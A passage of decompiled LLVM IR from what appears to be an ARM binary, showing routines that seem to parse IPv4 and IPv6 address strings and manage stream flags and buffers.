dec_label_pc_15a10:                               ; preds = %dec_label_pc_15a0c
  %v0_15a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a10 = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_15a10, %v1_15a10
  br i1 %tmp18, label %dec_label_pc_15a18, label %dec_label_pc_15a1cthread-pre-split

dec_label_pc_15a18:                               ; preds = %dec_label_pc_15a10, %bb14
  %v0_15a18 = load i32, i32* %r4.global-to-local, align 4
  %v1_15a18 = sub i32 0, %v0_15a18
  store i32 %v1_15a18, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a1c

dec_label_pc_15a1cthread-pre-split:               ; preds = %dec_label_pc_15a10, %dec_label_pc_15a0c
  %v0_15a1c.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_15a1cthread-pre-split, %dec_label_pc_15a18
  %v0_15a1c = phi i32 [ %v0_15a1c.pr, %dec_label_pc_15a1cthread-pre-split ], [ %v1_15a18, %dec_label_pc_15a18 ]
  %v1_15a1c = icmp slt i32 %v0_15a1c, 0
  br i1 %v1_15a1c, label %dec_label_pc_15a24, label %dec_label_pc_15a38

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a1c
  %v0_15a24 = call i32 @function_ce08()
  store i32 %v0_15a24, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_15a2c = inttoptr i32 %v0_15a24 to i32*
  store i32 75, i32* %v2_15a2c, align 4
  %v0_15a38.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a38

dec_label_pc_15a34:                               ; preds = %dec_label_pc_159b8, %dec_label_pc_159b0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a38

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a1c, %dec_label_pc_15a24, %dec_label_pc_15a34
  %v0_15a38 = phi i32 [ %v0_15a1c, %dec_label_pc_15a1c ], [ %v0_15a38.pre, %dec_label_pc_15a24 ], [ -1, %dec_label_pc_15a34 ]
  store i32 %v0_15a38, i32* %r0.global-to-local, align 4
  %v2_15a40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15a40, i32* @r4, align 4
  ret i32 %v0_15a38

; uselistorder directives
  uselistorder i32 %v0_15a38, { 1, 0 }
  uselistorder i1 %v9_15a00, { 1, 0 }
  uselistorder i32 %v2_15a00, { 1, 0 }
  uselistorder i32 %v10_159fc, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_159f0, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 0, { 6, 0, 1, 7, 2, 3, 4, 5, 8 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_15a38, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @function_15a48(i32 %arg1) local_unnamed_addr {
dec_label_pc_15a48:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15a48 = load i32, i32* @r4, align 4
  store i32 %v3_15a48, i32* %stack_var_-8, align 4
  %v1_15a4c = add i32 %arg1, 8
  %v1_15a50 = inttoptr i32 %v1_15a4c to i32*
  %v2_15a50 = load i32, i32* %v1_15a50, align 4
  %v3_15a50 = add i32 %arg1, 12
  %v4_15a50 = inttoptr i32 %v3_15a50 to i32*
  %v5_15a50 = load i32, i32* %v4_15a50, align 4
  %v2_15a54 = sub i32 %v5_15a50, %v2_15a50
  store i32 %v2_15a54, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_15a5c = inttoptr i32 %arg1 to i16*
  %v4_15a5c = call i32 @function_1592c(i16* %v3_15a5c, i32 %v2_15a50, i32 %v2_15a54)
  %v0_15a60 = load i32, i32* @r4, align 4
  %v1_15a60 = add i32 %v0_15a60, 8
  %v2_15a60 = inttoptr i32 %v1_15a60 to i32*
  %v3_15a60 = load i32, i32* %v2_15a60, align 4
  store i32 %v3_15a60, i32* %r2.global-to-local, align 4
  %v2_15a64 = add i32 %v3_15a60, %v4_15a5c
  %v2_15a68 = add i32 %v0_15a60, 20
  %v3_15a68 = inttoptr i32 %v2_15a68 to i32*
  store i32 %v2_15a64, i32* %v3_15a68, align 4
  %v0_15a6c = load i32, i32* %r2.global-to-local, align 4
  %v1_15a6c = load i32, i32* @r4, align 4
  %v2_15a6c = add i32 %v1_15a6c, 16
  %v3_15a6c = inttoptr i32 %v2_15a6c to i32*
  store i32 %v0_15a6c, i32* %v3_15a6c, align 4
  %v2_15a70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15a70, i32* @r4, align 4
  ret i32 %v4_15a5c

; uselistorder directives
  uselistorder i32 %v4_15a5c, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_15a78() local_unnamed_addr {
dec_label_pc_15a78:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15a78 = load i32, i32* @r4, align 4
  store i32 %v3_15a78, i32* %stack_var_-12, align 4
  %v0_15a7c = load i32, i32* @r0, align 4
  %v1_15a7c = inttoptr i32 %v0_15a7c to i16*
  %v2_15a7c = load i16, i16* %v1_15a7c, align 2
  %v3_15a7c = zext i16 %v2_15a7c to i32
  store i32 %v3_15a7c, i32* %r3.global-to-local, align 4
  %v0_15a80 = load i32, i32* @r1, align 4
  %v2_15a80 = and i32 %v0_15a80, %v3_15a7c
  %v4_15a80 = icmp eq i32 %v2_15a80, 0
  store i32 %v0_15a7c, i32* @r4, align 4
  br i1 %v4_15a80, label %dec_label_pc_15a90, label %dec_label_pc_15aa0

dec_label_pc_15a90:                               ; preds = %dec_label_pc_15a78
  %v1_15a90 = and i32 %v3_15a7c, 2176
  %v2_15a90 = icmp eq i32 %v1_15a90, 0
  br i1 %v2_15a90, label %dec_label_pc_15a98, label %dec_label_pc_15aac

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a90
  %v2_15a98 = or i32 %v0_15a80, %v3_15a7c
  store i32 %v2_15a98, i32* %r3.global-to-local, align 4
  %v1_15a9c = trunc i32 %v2_15a98 to i16
  store i16 %v1_15a9c, i16* %v1_15a7c, align 2
  %v0_15aa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %dec_label_pc_15a78, %dec_label_pc_15a98
  %v0_15aa0 = phi i32 [ %v0_15a7c, %dec_label_pc_15a78 ], [ %v0_15aa0.pre, %dec_label_pc_15a98 ]
  %v1_15aa0 = inttoptr i32 %v0_15aa0 to i16*
  %v2_15aa0 = load i16, i16* %v1_15aa0, align 2
  %v3_15aa0 = zext i16 %v2_15aa0 to i32
  store i32 %v3_15aa0, i32* %r3.global-to-local, align 4
  %v1_15aa4 = and i32 %v3_15aa0, 16
  store i32 %v1_15aa4, i32* %r5.global-to-local, align 4
  %v2_15aa4 = icmp eq i32 %v1_15aa4, 0
  br i1 %v2_15aa4, label %dec_label_pc_15acc, label %dec_label_pc_15aac

dec_label_pc_15aac:                               ; preds = %dec_label_pc_15a90, %dec_label_pc_15aa0
  %v0_15aac = call i32 @function_ce08()
  store i32 %v0_15aac, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_15ab4 = inttoptr i32 %v0_15aac to i32*
  store i32 9, i32* %v2_15ab4, align 4
  br label %dec_label_pc_15ab8

dec_label_pc_15ab8:                               ; preds = %dec_label_pc_15ad4, %dec_label_pc_15aac
  %v0_15ab8 = load i32, i32* @r4, align 4
  %v1_15ab8 = inttoptr i32 %v0_15ab8 to i16*
  %v2_15ab8 = load i16, i16* %v1_15ab8, align 2
  %v3_15ab8 = zext i16 %v2_15ab8 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15ac0 = or i32 %v3_15ab8, 8
  store i32 %v1_15ac0, i32* %r3.global-to-local, align 4
  %v1_15ac4 = trunc i32 %v1_15ac0 to i16
  store i16 %v1_15ac4, i16* %v1_15ab8, align 2
  %v1_15b0c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15b04

dec_label_pc_15acc:                               ; preds = %dec_label_pc_15aa0
  %v1_15acc = and i32 %v3_15aa0, 64
  %v2_15acc = icmp eq i32 %v1_15acc, 0
  br i1 %v2_15acc, label %dec_label_pc_15af4, label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15acc
  %v0_15ad4 = call i32 @function_d978()
  store i32 %v0_15ad4, i32* %r0.global-to-local, align 4
  %v2_15ad8 = icmp eq i32 %v0_15ad4, 0
  br i1 %v2_15ad8, label %dec_label_pc_15ae0, label %dec_label_pc_15ab8

dec_label_pc_15ae0:                               ; preds = %dec_label_pc_15ad4
  %v0_15ae0 = load i32, i32* @r4, align 4
  %v1_15ae0 = inttoptr i32 %v0_15ae0 to i16*
  %v2_15ae0 = load i16, i16* %v1_15ae0, align 2
  %v3_15ae0 = zext i16 %v2_15ae0 to i32
  store i32 %v3_15ae0, i32* %r3.global-to-local, align 4
  %v1_15ae4 = add i32 %v0_15ae0, 8
  %v2_15ae4 = inttoptr i32 %v1_15ae4 to i32*
  %v3_15ae4 = load i32, i32* %v2_15ae4, align 4
  %v1_15ae8 = and i32 %v3_15ae0, 65471
  store i32 %v1_15ae8, i32* %r3.global-to-local, align 4
  %v2_15aec = add i32 %v0_15ae0, 28
  %v3_15aec = inttoptr i32 %v2_15aec to i32*
  store i32 %v3_15ae4, i32* %v3_15aec, align 4
  %v0_15af0 = load i32, i32* %r3.global-to-local, align 4
  %v1_15af0 = trunc i32 %v0_15af0 to i16
  %v2_15af0 = load i32, i32* @r4, align 4
  %v3_15af0 = inttoptr i32 %v2_15af0 to i16*
  store i16 %v1_15af0, i16* %v3_15af0, align 2
  %v0_15af4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15acc, %dec_label_pc_15ae0
  %v2_15afc = phi i32 [ %v0_15aa0, %dec_label_pc_15acc ], [ %v0_15af4.pre, %dec_label_pc_15ae0 ]
  %v1_15af4 = inttoptr i32 %v2_15afc to i16*
  %v2_15af4 = load i16, i16* %v1_15af4, align 2
  %v3_15af4 = zext i16 %v2_15af4 to i32
  %v1_15af8 = or i32 %v3_15af4, 1
  store i32 %v1_15af8, i32* %r3.global-to-local, align 4
  %v1_15afc = trunc i32 %v1_15af8 to i16
  store i16 %v1_15afc, i16* %v1_15af4, align 2
  %v0_15b00 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15b00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15b04

dec_label_pc_15b04:                               ; preds = %dec_label_pc_15ab8, %dec_label_pc_15af4
  %v1_15b0c = phi i32 [ %v1_15b0c.pre, %dec_label_pc_15ab8 ], [ %v0_15b00, %dec_label_pc_15af4 ]
  %v2_15b08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15b08, i32* @r4, align 4
  ret i32 %v1_15b0c

; uselistorder directives
  uselistorder i32 %v3_15a7c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @function_d978, { 2, 5, 4, 3, 7, 6, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_15b04, { 1, 0 }
  uselistorder label %dec_label_pc_15af4, { 1, 0 }
  uselistorder label %dec_label_pc_15aac, { 1, 0 }
  uselistorder label %dec_label_pc_15aa0, { 1, 0 }
}

define i32 @function_15b10(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15b10:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_15b1c = load i32, i32* %arg2, align 4
  %v3_15b1c = add i32 %tmp, 4
  %v4_15b1c = inttoptr i32 %v3_15b1c to i32*
  %v5_15b1c = load i32, i32* %v4_15b1c, align 4
  %v1_15b20 = add i32 %arg1, 4
  %v2_15b20 = inttoptr i32 %v1_15b20 to i32*
  %v3_15b20 = load i32, i32* %v2_15b20, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_15b28 = call i32 @function_17534(i32 %v3_15b20, i32 %tmp, i32 %v2_15b1c, i32 %v5_15b1c)
  %v1_15b2c = icmp slt i32* %arg2, null
  br i1 %v1_15b2c, label %bb13, label %bb

bb:                                               ; preds = %dec_label_pc_15b10
  %v3_15b345 = load i32, i32* @r4, align 4
  %v4_15b346 = inttoptr i32 %v3_15b345 to i32*
  store i32 %v4_15b28, i32* %v4_15b346, align 4
  %v6_15b347 = add i32 %v3_15b345, 4
  %v7_15b348 = inttoptr i32 %v6_15b347 to i32*
  store i32 %tmp, i32* %v7_15b348, align 4
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_15b10, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_15b28, %dec_label_pc_15b10 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* null, { 2, 3, 0, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @function_15b4c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15b4c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15b4c = load i32, i32* @r4, align 4
  %v6_15b4c = load i32, i32* @r5, align 4
  %v15_15b4c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_15b64 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15b64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_15bdc1 = load i32, i32* @r0, align 4
  %v1_15bdc2 = inttoptr i32 %v0_15bdc1 to i8*
  %v2_15bdc3 = load i8, i8* %v1_15bdc2, align 1
  %v3_15bdc4 = zext i8 %v2_15bdc3 to i32
  store i32 %v3_15bdc4, i32* @r3, align 4
  %v2_15be05 = icmp eq i8 %v2_15bdc3, 0
  store i1 %v2_15be05, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15be05, label %dec_label_pc_15bec, label %dec_label_pc_15b7c

dec_label_pc_15b7c:                               ; preds = %dec_label_pc_15b4c, %dec_label_pc_15bdc.backedge
  %v0_15b80 = phi i32 [ %v0_15bdc, %dec_label_pc_15bdc.backedge ], [ %v0_15bdc1, %dec_label_pc_15b4c ]
  %v0_15bb8 = phi i32 [ %v3_15bdc, %dec_label_pc_15bdc.backedge ], [ %v3_15bdc4, %dec_label_pc_15b4c ]
  %v2_15b8c.in = phi i32 [ %v3_15bdc, %dec_label_pc_15bdc.backedge ], [ %v3_15bdc4, %dec_label_pc_15b4c ]
  %v2_15b8c = add nsw i32 %v2_15b8c.in, -48
  %v2_15b7c = icmp ugt i32 %v2_15b8c, 8
  %v7_15b7c = icmp eq i32 %v2_15b8c, 9
  store i1 %v7_15b7c, i1* %cpsr_z.global-to-local, align 1
  %v1_15b80 = add i32 %v0_15b80, 1
  store i32 %v1_15b80, i32* %r0.global-to-local, align 4
  %v2_15b84 = xor i1 %v7_15b7c, true
  %v3_15b84 = and i1 %v2_15b7c, %v2_15b84
  br i1 %v3_15b84, label %dec_label_pc_15bb8, label %dec_label_pc_15b88

dec_label_pc_15b88:                               ; preds = %dec_label_pc_15b7c
  %v0_15b88 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b88 = inttoptr i32 %v0_15b88 to i8*
  %v2_15b88 = load i8, i8* %v1_15b88, align 1
  %v3_15b88 = zext i8 %v2_15b88 to i32
  %v0_15b8c = load i32, i32* %r7.global-to-local, align 4
  %v3_15b8c = mul i32 %v0_15b8c, %v3_15b88
  %v4_15b8c = add i32 %v3_15b8c, %v2_15b8c
  store i32 %v4_15b8c, i32* @r3, align 4
  %v2_15b90 = icmp ugt i32 %v4_15b8c, 254
  %v7_15b90 = icmp eq i32 %v4_15b8c, 255
  store i1 %v7_15b90, i1* %cpsr_z.global-to-local, align 1
  %v2_15b94 = xor i1 %v7_15b90, true
  %v3_15b94 = and i1 %v2_15b90, %v2_15b94
  br i1 %v3_15b94, label %dec_label_pc_15c10, label %dec_label_pc_15b98

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b88
  %v0_15b98 = load i32, i32* @lr, align 4
  %v2_15b98 = icmp eq i32 %v0_15b98, 0
  store i1 %v2_15b98, i1* %cpsr_z.global-to-local, align 1
  %v1_15b9c = trunc i32 %v4_15b8c to i8
  store i8 %v1_15b9c, i8* %v1_15b88, align 1
  %v0_15ba0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ba0, label %dec_label_pc_15ba4, label %dec_label_pc_15bdc.backedge

dec_label_pc_15ba4:                               ; preds = %dec_label_pc_15b98
  %v0_15ba4 = load i32, i32* @ip, align 4
  %v1_15ba4 = add i32 %v0_15ba4, 1
  store i32 %v1_15ba4, i32* @ip, align 4
  %v7_15ba8 = icmp eq i32 %v1_15ba4, 4
  store i1 %v7_15ba8, i1* %cpsr_z.global-to-local, align 1
  %v0_15bac = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15bac, i32* @lr, align 4
  %v8_15bb0 = icmp sgt i32 %v1_15ba4, 4
  br i1 %v8_15bb0, label %dec_label_pc_15c10, label %dec_label_pc_15bdc.backedge

dec_label_pc_15bb8:                               ; preds = %dec_label_pc_15b7c
  %v7_15bb8 = icmp eq i32 %v0_15bb8, 46
  %v1_15bc0 = load i32, i32* @lr, align 4
  %v2_15bc0 = urem i32 %v1_15bc0, 2
  %storemerge12 = select i1 %v7_15bb8, i32 %v2_15bc0, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_15bc4 = icmp eq i32 %storemerge12, 0
  store i1 %v2_15bc4, i1* %cpsr_z.global-to-local, align 1
  %v0_15bc8 = load i32, i32* @r5, align 4
  store i32 %v0_15bc8, i32* @lr, align 4
  br i1 %v2_15bc4, label %dec_label_pc_15c10, label %dec_label_pc_15bd0

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15bb8
  %v0_15bd0 = load i32, i32* @ip, align 4
  %v7_15bd0 = icmp eq i32 %v0_15bd0, 4
  store i1 %v7_15bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15bd0, label %dec_label_pc_15c10, label %dec_label_pc_15bd8

dec_label_pc_15bd8:                               ; preds = %dec_label_pc_15bd0
  %v1_15bd8 = trunc i32 %v0_15bc8 to i8
  %v2_15bd8 = load i32, i32* %r1.global-to-local, align 4
  %v3_15bd8 = add i32 %v2_15bd8, 1
  %v4_15bd8 = inttoptr i32 %v3_15bd8 to i8*
  store i8 %v1_15bd8, i8* %v4_15bd8, align 1
  %v5_15bd8 = load i32, i32* %r1.global-to-local, align 4
  %v6_15bd8 = add i32 %v5_15bd8, 1
  store i32 %v6_15bd8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15bdc.backedge

dec_label_pc_15bdc.backedge:                      ; preds = %dec_label_pc_15bd8, %dec_label_pc_15b98, %dec_label_pc_15ba4
  %v0_15bdc = load i32, i32* %r0.global-to-local, align 4
  %v1_15bdc = inttoptr i32 %v0_15bdc to i8*
  %v2_15bdc = load i8, i8* %v1_15bdc, align 1
  %v3_15bdc = zext i8 %v2_15bdc to i32
  store i32 %v3_15bdc, i32* @r3, align 4
  %v2_15be0 = icmp eq i8 %v2_15bdc, 0
  store i1 %v2_15be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15be0, label %dec_label_pc_15bdc.dec_label_pc_15bec_crit_edge, label %dec_label_pc_15b7c

dec_label_pc_15bdc.dec_label_pc_15bec_crit_edge:  ; preds = %dec_label_pc_15bdc.backedge
  %v0_15bec.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15bec

dec_label_pc_15bec:                               ; preds = %dec_label_pc_15bdc.dec_label_pc_15bec_crit_edge, %dec_label_pc_15b4c
  %v0_15bec = phi i32 [ %v0_15bec.pre, %dec_label_pc_15bdc.dec_label_pc_15bec_crit_edge ], [ 0, %dec_label_pc_15b4c ]
  %v7_15bec = icmp eq i32 %v0_15bec, 3
  store i1 %v7_15bec, i1* %cpsr_z.global-to-local, align 1
  %v7_15bf0 = icmp slt i32 %v0_15bec, 4
  br i1 %v7_15bf0, label %dec_label_pc_15c10, label %dec_label_pc_15bf4

dec_label_pc_15bf4:                               ; preds = %dec_label_pc_15bec
  %v0_15bf4 = load i32, i32* @r4, align 4
  store i32 %v0_15bf4, i32* @r0, align 4
  store i32 %v2_15b64, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_15c00 = call i32 @function_f350()
  br label %dec_label_pc_15c10

dec_label_pc_15c10:                               ; preds = %dec_label_pc_15b88, %dec_label_pc_15ba4, %dec_label_pc_15bb8, %dec_label_pc_15bd0, %dec_label_pc_15bec, %dec_label_pc_15bf4
  %storemerge = phi i32 [ 1, %dec_label_pc_15bf4 ], [ 0, %dec_label_pc_15bec ], [ 0, %dec_label_pc_15bd0 ], [ 0, %dec_label_pc_15bb8 ], [ 0, %dec_label_pc_15ba4 ], [ 0, %dec_label_pc_15b88 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_15b4c, i32* @r4, align 4
  store i32 %v6_15b4c, i32* @r5, align 4
  store i32 %v15_15b4c, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_15bec, { 1, 0 }
  uselistorder i32 %v3_15bdc, { 2, 1, 0 }
  uselistorder i32 %v0_15bdc, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_15b8c, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_15c10, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15bdc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15b7c, { 1, 0 }
}

define i32 @function_15c1c(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15c1c:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %v3_15c1c = load i32, i32* @r4, align 4
  %v6_15c1c = load i32, i32* @r5, align 4
  %v9_15c1c = load i32, i32* @r6, align 4
  %v12_15c1c = load i32, i32* @r7, align 4
  %v27_15c1c = load i32, i32* @lr, align 4
  %v7_15c28 = icmp eq i32 %arg1, 2
  store i32 142044, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_15c28, label %dec_label_pc_15c48, label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15c1c
  %v7_15c3c = icmp eq i32 %arg1, 10
  br i1 %v7_15c3c, label %dec_label_pc_15c58, label %dec_label_pc_15e10

dec_label_pc_15c48:                               ; preds = %dec_label_pc_15c1c
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_15c50 = call i32 @function_15b4c(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_15e20

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c3c
  %v2_15c58 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_15c64 = bitcast i32* %stack_var_-56 to i8*
  %v3_15c64 = call i32 @function_f240(i8* %v2_15c64, i32 0)
  %v0_15c68 = load i32, i32* @r5, align 4
  %v1_15c68 = inttoptr i32 %v0_15c68 to i8*
  %v2_15c68 = load i8, i8* %v1_15c68, align 1
  %v3_15c68 = zext i8 %v2_15c68 to i32
  store i32 %v3_15c68, i32* %r3.global-to-local, align 4
  %v7_15c6c = icmp eq i8 %v2_15c68, 58
  store i32 %v3_15c64, i32* @r6, align 4
  %v2_15c74 = add i32 %v3_15c64, 16
  store i32 %v2_15c74, i32* %r8.global-to-local, align 4
  br i1 %v7_15c6c, label %dec_label_pc_15c7c, label %dec_label_pc_15c88

dec_label_pc_15c7c:                               ; preds = %dec_label_pc_15c58
  %v1_15c7c = add i32 %v0_15c68, 1
  %v2_15c7c = inttoptr i32 %v1_15c7c to i8*
  %v3_15c7c = load i8, i8* %v2_15c7c, align 1
  %v4_15c7c = zext i8 %v3_15c7c to i32
  store i32 %v4_15c7c, i32* %r3.global-to-local, align 4
  store i32 %v1_15c7c, i32* @r5, align 4
  %v7_15c80 = icmp eq i8 %v3_15c7c, 58
  br i1 %v7_15c80, label %dec_label_pc_15c88, label %dec_label_pc_15e08

dec_label_pc_15c88:                               ; preds = %dec_label_pc_15c7c, %dec_label_pc_15c58
  %v0_15c94 = phi i32 [ %v1_15c7c, %dec_label_pc_15c7c ], [ %v0_15c68, %dec_label_pc_15c58 ]
  store i32 -32952, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_15c94, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1aa24.639, i32 0, i32 0), i8** %stack_var_-64, align 4
  %v1_15d6c3 = inttoptr i32 %v0_15c94 to i8*
  %v2_15d6c4 = load i8, i8* %v1_15d6c3, align 1
  %v3_15d6c5 = zext i8 %v2_15d6c4 to i32
  store i32 %v3_15d6c5, i32* @r4, align 4
  %v2_15d706 = icmp eq i8 %v2_15d6c4, 0
  br i1 %v2_15d706, label %dec_label_pc_15d78.thread, label %dec_label_pc_15ca8

dec_label_pc_15d78.thread:                        ; preds = %dec_label_pc_15c88
  store i32 %v3_15c64, i32* @r4, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15c88, %dec_label_pc_15d6c.backedge.dec_label_pc_15ca8_crit_edge
  %v0_15cac = phi i32 [ %v3_15d6c, %dec_label_pc_15d6c.backedge.dec_label_pc_15ca8_crit_edge ], [ %v3_15d6c5, %dec_label_pc_15c88 ]
  %v2_15ca8 = phi i8* [ %v2_15ca8.pre, %dec_label_pc_15d6c.backedge.dec_label_pc_15ca8_crit_edge ], [ getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1aa24.639, i32 0, i32 0), %dec_label_pc_15c88 ]
  %v3_15ca8 = ptrtoint i8* %v2_15ca8 to i32
  store i32 %v3_15ca8, i32* @r0, align 4
  %v1_15cac = or i32 %v0_15cac, 32
  store i32 %v1_15cac, i32* %r1.global-to-local, align 4
  %v3_15cb0 = call i32 @function_14918(i32 %v3_15ca8, i32 %v1_15cac)
  %v2_15cb4 = icmp eq i32 %v3_15cb0, 0
  %v0_15cb8 = load i32, i32* @r5, align 4
  %v1_15cb8 = add i32 %v0_15cb8, 1
  store i32 %v1_15cb8, i32* @r5, align 4
  br i1 %v2_15cb4, label %dec_label_pc_15cdc, label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15ca8
  %v2_15cc0 = load i8*, i8** %stack_var_-64, align 4
  %v3_15cc0 = ptrtoint i8* %v2_15cc0 to i32
  store i32 %v3_15cc0, i32* %r2.global-to-local, align 4
  %v2_15cc4 = sub i32 %v3_15cb0, %v3_15cc0
  %v1_15cc8 = load i32, i32* @r7, align 4
  %v4_15cc8 = mul i32 %v1_15cc8, 16
  %v5_15cc8 = or i32 %v4_15cc8, %v2_15cc4
  store i32 %v5_15cc8, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_15cc8, 65536
  br i1 %tmp36, label %dec_label_pc_15d68, label %dec_label_pc_15e08

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15ca8
  %v0_15cdc = load i32, i32* @r4, align 4
  %v7_15cdc = icmp eq i32 %v0_15cdc, 58
  br i1 %v7_15cdc, label %dec_label_pc_15ce4, label %dec_label_pc_15d3c

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cdc
  %v0_15ce4 = load i32, i32* %sb.global-to-local, align 4
  %v2_15ce4 = icmp eq i32 %v0_15ce4, 0
